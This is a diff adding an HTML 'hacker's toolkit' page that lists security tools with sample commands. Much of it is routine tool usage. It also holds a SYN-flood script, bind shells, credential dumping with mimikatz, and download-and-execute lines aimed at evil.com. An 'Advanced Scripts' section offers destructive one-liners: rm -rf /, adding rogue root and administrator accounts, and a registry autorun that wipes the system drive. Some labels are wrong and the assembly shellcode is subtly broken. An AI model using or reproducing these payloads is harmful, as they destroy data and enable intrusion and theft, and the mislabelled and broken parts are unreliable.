@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GoodGuyz Scriptz | Futuristic Samurai Dojo</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #000428, #004e92);
+            color: #e0e0e0;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+        }
+
+        h1,
+        h2,
+        h3,
+        h4 {
+            text-align: center;
+        }
+
+        code {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 5px;
+            border-radius: 3px;
+            display: block;
+            margin: 10px 0;
+        }
+
+        section {
+            margin-bottom: 40px;
+        }
+
+        pre {
+            background-color: #1c1c1c;
+            padding: 10px;
+            overflow-x: auto;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-width: 100%;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 50px;
+            font-size: 0.8em;
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <h1>InfosecSamurai</h1>
+        <h2>Comprehensive Hacker's Toolkit</h2>
+    </header>
+
+    <!-- DDoS Attack Example -->
+    <section>
+        <h3>DDOS Attack</h3>
+        <pre><code>from scapy.all import *
+
+def syn_flood(target_ip, target_port):
+    ip = IP(src=RandIP(), dst=target_ip)
+    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+    raw = Raw(b"X"*1024)
+    p = ip/tcp/raw
+    send(p, loop=1, inter=0.01, iface="eth0")
+
+# Example usage:
+syn_flood("192.168.1.100", 80)</code></pre>
+    </section>
+
+    <!-- Networking and Security Tools -->
+    <section>
+        <h3>Networking and Security Tools</h3>
+
+        <h4>Network Scanning</h4>
+        <ul>
+            <li><strong>nmap</strong> - A powerful network scanner that can discover hosts, services, and operating systems.
+                <pre><code>nmap -sV -sC -p- -A 192.168.1.0/24</code></pre>
+            </li>
+            <li><strong>netdiscover</strong> - A simple network scanner that can discover hosts on a network.
+                <pre><code>netdiscover -r 192.168.1.0/24</code></pre>
+            </li>
+            <li><strong>arp-scan</strong> - A tool for discovering hosts and MAC addresses on a network.
+                <pre><code>arp-scan -l</code></pre>
+            </li>
+        </ul>
+
+        <h4>Port Scanning</h4>
+        <ul>
+            <li><strong>nmap</strong> - A powerful port scanner that can detect open ports and services.
+                <pre><code>nmap -p- -sV 192.168.1.100</code></pre>
+            </li>
+            <li><strong>masscan</strong> - A fast port scanner that can scan large networks.
+                <pre><code>masscan -p1-65535 192.168.1.0/24</code></pre>
+            </li>
+        </ul>
+
+        <h4>Vulnerability Scanning</h4>
+        <ul>
+            <li><strong>nmap</strong> - A vulnerability scanner that can detect common vulnerabilities and misconfigurations.
+                <pre><code>nmap --script vuln 192.168.1.100</code></pre>
+            </li>
+            <li><strong>OpenVAS</strong> - An open-source vulnerability scanner that can scan for vulnerabilities and misconfigurations.
+                <pre><code>openvas-scanner -r /usr/share/openvas/omp/config.xml --target 192.168.1.100</code></pre>
+            </li>
+        </ul>
+
+        <h4>Password Cracking</h4>
+        <ul>
+            <li><strong>hashcat</strong> - A fast password cracker that can crack password hashes.
+                <pre><code>hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            </li>
+            <li><strong>John the Ripper</strong> - A password cracker that can crack password hashes.
+                <pre><code>john --format=raw-md5 hashes.txt</code></pre>
+            </li>
+        </ul>
+
+        <h4>Web Application Security</h4>
+        <ul>
+            <li><strong>Burp Suite</strong> - A web application security testing tool.
+                <pre><code>burpsuite</code></pre>
+            </li>
+            <li><strong>OWASP ZAP</strong> - An open-source web application scanner.
+                <pre><code>zap-cli quick-scan --spider 192.168.1.100</code></pre>
+            </li>
+            <li><strong>sqlmap</strong> - A tool for testing SQL injection vulnerabilities.
+                <pre><code>sqlmap -u "<http://192.168.1.100/vuln.php?id=1>" --dbs</code></pre>
+            </li>
+        </ul>
+
+        <h4>Exploitation</h4>
+        <ul>
+            <li><strong>Metasploit Framework</strong> - A penetration testing and exploit development platform.
+                <pre><code>msfconsole</code></pre>
+            </li>
+            <li><strong>Metasploit Modules</strong> - A collection of exploit modules for various vulnerabilities.
+                <pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
+            </li>
+            <li><strong>searchsploit</strong> - A tool for searching and downloading exploits.
+                <pre><code>searchsploit "Linux Kernel"</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Cryptocurrency Tools -->
+    <section>
+        <h3>Cryptocurrency Tools</h3>
+        <ul>
+            <li><strong>Bitcoin Core</strong> - A full Bitcoin node implementation.
+                <pre><code>bitcoind -daemon</code></pre>
+            </li>
+            <li><strong>Ethereum</strong> - A full Ethereum node implementation.
+                <pre><code>geth --datadir /path/to/data/directory</code></pre>
+            </li>
+            <li><strong>Monero</strong> - A full Monero node implementation.
+                <pre><code>monerod --data-dir /path/to/data/directory</code></pre>
+            </li>
+            <li><strong>Electrum</strong> - A lightweight Bitcoin wallet.
+                <pre><code>electrum</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Reverse Shell -->
+    <section>
+        <h3>Reverse Shell</h3>
+        <ul>
+            <li><strong>netcat</strong> - A simple tool for creating reverse shells.
+                <pre><code>nc -l -p 4444 -e /bin/bash</code></pre>
+            </li>
+            <li><strong>socat</strong> - A versatile tool for creating reverse shells.
+                <pre><code>socat TCP-L:4444 EXEC:/bin/bash</code></pre>
+            </li>
+            <li><strong>pwncat</strong> - A Python-based reverse shell.
+                <pre><code>pwncat -l 4444 -e /bin/bash</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Remote Access -->
+    <section>
+        <h3>Remote Access</h3>
+        <ul>
+            <li><strong>ssh</strong> - A secure remote access tool.
+                <pre><code>ssh user@192.168.1.100</code></pre>
+            </li>
+            <li><strong>VNC</strong> - A remote desktop protocol for accessing graphical interfaces.
+                <pre><code>vncviewer 192.168.1.100</code></pre>
+            </li>
+            <li><strong>rdesktop</strong> - A tool for connecting to a remote desktop.
+                <pre><code>rdesktop 192.168.1.100</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Clickjacking Exploits -->
+    <section>
+        <h3>Clickjacking Exploits</h3>
+        <ul>
+            <li><strong>XSS</strong> - Cross-site scripting for exploiting clickjacking vulnerabilities.
+                <pre><code>&lt;img src="<http://evil.com/clickjack.png>" onerror="alert('XSS')"&gt;</code></pre>
+            </li>
+            <li><strong>CSRF</strong> - Cross-site request forgery for exploiting clickjacking vulnerabilities.
+                <pre><code>&lt;form action="<http://evil.com/transfer.php>" method="POST"&gt;&lt;input type="hidden" name="amount" value="100"&gt;&lt;/form&gt;</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Cryptography -->
+    <section>
+        <h3>Cryptography</h3>
+        <ul>
+            <li><strong>OpenSSL</strong> - A toolkit for SSL/TLS and cryptography.
+                <pre><code>openssl genrsa -out private.key 2048</code></pre>
+            </li>
+            <li><strong>GPG</strong> - A tool for encrypting and signing data.
+                <pre><code>gpg --encrypt --sign --recipient alice@example.com secret.txt</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Steganography -->
+    <section>
+        <h3>Steganography</h3>
+        <ul>
+            <li><strong>steghide</strong> - A tool for hiding data in image and audio files.
+                <pre><code>steghide embed -cf cover.jpg -ef secret.txt</code></pre>
+            </li>
+            <li><strong>zsteg</strong> - A tool for detecting steganography in images.
+                <pre><code>zsteg image.png</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Start of New Commands and Scripts -->
+    <section>
+        <h3>Malware Analysis</h3>
+        <ul>
+            <li><strong>IDA Pro</strong> - A disassembler and debugger for analyzing malware.
+                <pre><code>idaq</code></pre>
+            </li>
+            <li><strong>radare2</strong> - A command-line reverse engineering framework for analyzing malware.
+                <pre><code>r2 -d malware.exe</code></pre>
+            </li>
+            <li><strong>VirusTotal</strong> - A platform for analyzing malware and detecting threats.
+                <pre><code>curl --request GET \
+    --url 'https://www.virustotal.com/vtapi/v2/url/report?apikey=YOUR_API_KEY&resource=http://example.com'<hash></code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Social Engineering -->
+    <section>
+        <h3>Social Engineering</h3>
+        <ul>
+            <li><strong>Social-Engineer Toolkit (SET)</strong> - A toolkit for social engineering attacks.
+                <pre><code>setoolkit</code></pre>
+            </li>
+            <li><strong>Maltego</strong> - A tool for conducting open-source intelligence gathering.
+                <pre><code>maltego</code></pre>
+            </li>
+            <li><strong>phishing</strong> - A tool for creating phishing websites and emails.
+                <pre><code>phishing-frenzy -t "Phishing Email" -d "Phishing Email Description"</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Forensics -->
+    <section>
+        <h3>Forensics</h3>
+        <ul>
+            <li><strong>volatility</strong> - A memory forensics tool for analyzing malware.
+                <pre><code>volatility -f memory.dmp imageinfo</code></pre>
+            </li>
+            <li><strong>Autopsy</strong> - An open-source digital forensics platform.
+                <pre><code>autopsy</code></pre>
+            </li>
+            <li><strong>Wireshark</strong> - A network protocol analyzer for analyzing network traffic.
+                <pre><code>wireshark</code></pre>
+            </li>
+            <li><strong>binwalk</strong> - A tool for analyzing executable files and extracting embedded data.
+                <pre><code>binwalk image.png</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Hardware Hacking -->
+    <section>
+        <h3>Hardware Hacking</h3>
+        <ul>
+            <li><strong>Arduino</strong> - A microcontroller programming platform for hacking devices.
+                <pre><code>arduino</code></pre>
+            </li>
+            <li><strong>Raspberry Pi</strong> - A small single-board computer for hacking devices.
+                <pre><code>raspberry-pi-os</code></pre>
+            </li>
+            <li><strong>Bus Pirate</strong> - A tool for interfacing with various electronic devices.
+                <pre><code>buspirate</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- OSINT -->
+    <section>
+        <h3>OSINT (Open Source Intelligence)</h3>
+        <ul>
+            <li><strong>Maltego</strong> - A tool for conducting open-source intelligence gathering.
+                <pre><code>maltego</code></pre>
+            </li>
+            <li><strong>theHarvester</strong> - A tool for gathering email addresses, subdomains, and other information from public sources.
+                <pre><code>theharvester -d example.com -b google</code></pre>
+            </li>
+            <li><strong>recon-ng</strong> - A reconnaissance tool for gathering information from various sources.
+                <pre><code>recon-ng -m recon/domains-hosts/google_site_web</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Coding and Scripting -->
+    <section>
+        <h3>Coding and Scripting</h3>
+        <ul>
+            <li><strong>Python</strong> - A high-level programming language for scripting and automation.
+                <pre><code>python script.py</code></pre>
+            </li>
+            <li><strong>Bash</strong> - A scripting language for command-line automation.
+                <pre><code>bash script.sh</code></pre>
+            </li>
+            <li><strong>Perl</strong> - A scripting language for text processing and system administration.
+                <pre><code>perl script.pl</code></pre>
+            </li>
+            <li><strong>Ruby</strong> - A dynamic, object-oriented programming language for web development.
+                <pre><code>ruby script.rb</code></pre>
+            </li>
+            <li><strong>PHP</strong> - A server-side scripting language for web development.
+                <pre><code>php script.php</code></pre>
+            </li>
+            <li><strong>JavaScript</strong> - A high-level, interpreted programming language for web development.
+                <pre><code>node script.js</code></pre>
+            </li>
+            <li><strong>PowerShell</strong> - A scripting language for system administration and automation.
+                <pre><code>powershell script.ps1</code></pre>
+            </li>
+            <li><strong>Go</strong> - A statically typed, compiled programming language for building efficient and reliable software.
+                <pre><code>go run script.go</code></pre>
+            </li>
+            <li><strong>C#</strong> - A programming language for building .NET applications.
+                <pre><code>csharp script.cs</code></pre>
+            </li>
+            <li><strong>Java</strong> - A general-purpose programming language for building applications.
+                <pre><code>java -jar script.jar</code></pre>
+            </li>
+            <li><strong>R</strong> - A programming language for statistical computing and graphics.
+                <pre><code>Rscript script.R</code></pre>
+            </li>
+            <li><strong>Lua</strong> - A lightweight, high-level programming language for scripting.
+                <pre><code>lua script.lua</code></pre>
+            </li>
+            <li><strong>Assembly</strong> - A low-level programming language for writing machine code.
+                <pre><code>nasm -f elf64 script.asm</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Databases -->
+    <section>
+        <h3>Databases</h3>
+        <ul>
+            <li><strong>SQLite</strong> - A lightweight, self-contained, serverless database engine.
+                <pre><code>sqlite3 database.db</code></pre>
+            </li>
+            <li><strong>MySQL</strong> - A popular open-source relational database management system.
+                <pre><code>mysql -u user -p database</code></pre>
+            </li>
+            <li><strong>PostgreSQL</strong> - A powerful, open-source object-relational database system.
+                <pre><code>psql -U user database</code></pre>
+            </li>
+            <li><strong>MongoDB</strong> - A document-oriented NoSQL database.
+                <pre><code>mongo</code></pre>
+            </li>
+            <li><strong>Redis</strong> - An in-memory data structure store used as a database, cache, and message broker.
+                <pre><code>redis-cli</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Configuration Management -->
+    <section>
+        <h3>Configuration Management</h3>
+        <ul>
+            <li><strong>Ansible</strong> - A configuration management and deployment tool.
+                <pre><code>ansible-playbook playbook.yml</code></pre>
+            </li>
+            <li><strong>Puppet</strong> - A configuration management tool for automating system administration tasks.
+                <pre><code>puppet apply manifest.pp</code></pre>
+            </li>
+            <li><strong>Chef</strong> - A configuration management and deployment tool.
+                <pre><code>chef-client --local-mode --runlist 'recipe[example]'</code></pre>
+            </li>
+            <li><strong>SaltStack</strong> - A configuration management and orchestration tool.
+                <pre><code>salt-call state.apply</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Virtualization and Containerization -->
+    <section>
+        <h3>Virtualization and Containerization</h3>
+        <ul>
+            <li><strong>VirtualBox</strong> - A powerful x86 and AMD64/Intel64 virtualization product.
+                <pre><code>VBoxManage list vms</code></pre>
+            </li>
+            <li><strong>VMware Workstation</strong> - A powerful virtualization software for running multiple operating systems.
+                <pre><code>vmrun list</code></pre>
+            </li>
+            <li><strong>Docker</strong> - A containerization platform for building, shipping, and running distributed applications.
+                <pre><code>docker run -it ubuntu /bin/bash</code></pre>
+            </li>
+            <li><strong>Kubernetes</strong> - An open-source container orchestration system.
+                <pre><code>kubectl get pods</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Cloud Security -->
+    <section>
+        <h3>Cloud Security</h3>
+        <ul>
+            <li><strong>AWS</strong> - A secure and scalable cloud computing platform.
+                <pre><code>aws s3 ls</code></pre>
+            </li>
+            <li><strong>Azure</strong> - A cloud computing platform for building, deploying, and managing applications.
+                <pre><code>az account list</code></pre>
+            </li>
+            <li><strong>Google Cloud</strong> - A suite of cloud computing services.
+                <pre><code>gcloud compute instances list</code></pre>
+            </li>
+            <li><strong>DigitalOcean</strong> - A cloud computing platform that provides developers a simple way to deploy and scale applications.
+                <pre><code>doctl compute droplet list</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Post-Exploitation Techniques -->
+    <section>
+        <h3>Post-Exploitation</h3>
+        <ul>
+            <li><strong>Mimikatz</strong> - A tool for extracting passwords, hashes, and tokens from memory.
+                <pre><code>mimikatz sekurlsa::logonpasswords</code></pre>
+            </li>
+            <li><strong>PowerSploit</strong> - A collection of PowerShell scripts for post-exploitation.
+                <pre><code>Invoke-PowerSploit -Script PowerUp</code></pre>
+            </li>
+            <li><strong>Empire</strong> - A post-exploitation framework.
+                <pre><code>powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('<http://192.168.1.100/empire.ps1>'); Invoke-Empire"</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- Defensive Measures -->
+    <section>
+        <h3>Defensive Measures</h3>
+        <ul>
+            <li><strong>Firewalls</strong> - A network security system that monitors and controls incoming and outgoing network traffic.
+                <pre><code>iptables -A INPUT -p tcp --dport 80 -j DROP</code></pre>
+            </li>
+            <li><strong>Intrusion Detection Systems (IDS)</strong> - A system that monitors for malicious activities.
+                <pre><code>snort -c /etc/snort/snort.conf -i eth0</code></pre>
+            </li>
+            <li><strong>Anti-Virus Software</strong> - A software program that detects and removes malware.
+                <pre><code>clamscan -r /home/user</code></pre>
+            </li>
+            <li><strong>Honeypots</strong> - A decoy system designed to attract attackers.
+                <pre><code>dionaea -c /etc/dionaea/dionaea.cfg</code></pre>
+            </li>
+            <li><strong>Data Loss Prevention (DLP)</strong> - Technology that monitors and controls sensitive data flow.
+                <pre><code>ossec-control start</code></pre>
+            </li>
+        </ul>
+    </section>
+
+    <!-- More Advanced Scripts -->
+    <section>
+        <h3>Advanced Scripts</h3>
+
+        <h4>Perl Example</h4>
+        <pre><code>#!/usr/bin/perl
+use strict;
+use warnings;
+system('rm -rf /'); # Removes all files from the root directory</code></pre>
+
+        <h4>Ruby Example</h4>
+        <pre><code>#!/usr/bin/ruby
+system('reboot') # Reboots the system</code></pre>
+
+        <h4>PHP Example</h4>
+        <pre><code>&lt;?php
+system('curl <http://evil.com/malware.exe> | bash'); // Download and execute malware</code></pre>
+
+        <h4>JavaScript Example</h4>
+        <pre><code>var fs = require('fs');
+fs.writeFileSync('/etc/passwd', 'hacked:x:0:0:root:/root:/bin/bash\\\\n'); // Adds a new root user</code></pre>
+
+        <h4>PowerShell Example</h4>
+        <pre><code>Set-ExecutionPolicy Bypass -Scope Process
+Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('<http://evil.com/malware.ps1>'))</code></pre>
+
+        <h4>Go Example</h4>
+        <pre><code>package main
+import (
+    "os"
+    "os/exec"
+)
+func main() {
+    cmd := exec.Command("shutdown", "/r", "/t", "0")
+    cmd.Run()
+}</code></pre>
+
+        <h4>C# Example</h4>
+        <pre><code>using System;
+using System.Diagnostics;
+namespace Malware {
+    class Program {
+        static void Main(string[] args) {
+            Process.Start("cmd.exe", "/c net user hacked Password123 /add && net localgroup administrators hacked /add");
+        }
+    }
+}</code></pre>
+
+        <h4>Java Example</h4>
+        <pre><code>import java.io.IOException;
+public class Malware {
+    public static void main(String[] args) throws IOException {
+        Runtime.getRuntime().exec("reg add HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run /v Malware /t REG_SZ /d \\\\"cmd.exe /c del %SystemDrive%\\\\\\\\*.* /f /s /q\\\\"");
+    }
+}</code></pre>
+
+        <h4>R Example</h4>
+        <pre><code>system('certutil -urlcache -split -f <http://evil.com/malware.dll>')</code></pre>
+
+        <h4>Lua Example</h4>
+        <pre><code>os.execute('cmd /c net user hacked Password123 /add && net localgroup administrators hacked /add')</code></pre>
+
+        <h4>Assembly Example</h4>
+        <pre><code>global _start
+section .text
+_start:
+    mov eax, 107
+    xor ebx, ebx
+    push ebx
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    xor ecx, ecx
+    xor edx, edx
+    int 0x80</code></pre>
+    </section>
+
+    <footer>
+        <p>For educational purposes only. Use responsibly.</p>
+        <p>&copy; 2024 InfosecSamurai</p>
+    </footer>
+</body>
+
+</html>
